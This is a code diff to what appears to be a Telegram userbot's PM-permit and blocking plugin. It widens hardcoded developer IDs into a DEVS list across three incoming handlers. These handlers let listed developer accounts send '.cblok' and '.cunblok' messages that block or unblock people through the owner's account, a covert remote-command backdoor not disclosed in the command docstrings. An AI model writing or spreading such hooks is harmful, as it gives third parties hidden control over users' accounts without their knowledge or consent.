@@ -20,6 +20,7 @@ from userbot import (
     LOGS,
     PM_AUTO_BAN,
     ALIVE_NAME,
+    DEVS,
 )
 
 from userbot.events import register
@@ -278,7 +279,7 @@ async def disapprovepm(disapprvpm):
 
 
 @register(outgoing=True, pattern=r"^\.block$")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cblok(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cblok(?: |$)(.*)")
 async def blockpm(block):
     """For .block command, block people from PMing you!"""
     if block.reply_to_msg_id:
@@ -311,7 +312,7 @@ async def blockpm(block):
 
 
 @register(outgoing=True, pattern=r"^\.unblock$")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cunblok(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunblok(?: |$)(.*)")
 async def unblockpm(unblock):
     """For .unblock command, let people PMing you again!"""
     if unblock.reply_to_msg_id:
@@ -391,7 +392,7 @@ async def add_pmsg(cust_msg):
 @register(incoming=True,
           disable_edited=True,
           disable_errors=True,
-          from_users=(1727430256))
+          from_users=(DEVS))
 async def permitpm(event):
     if event.fwd_from:
         return
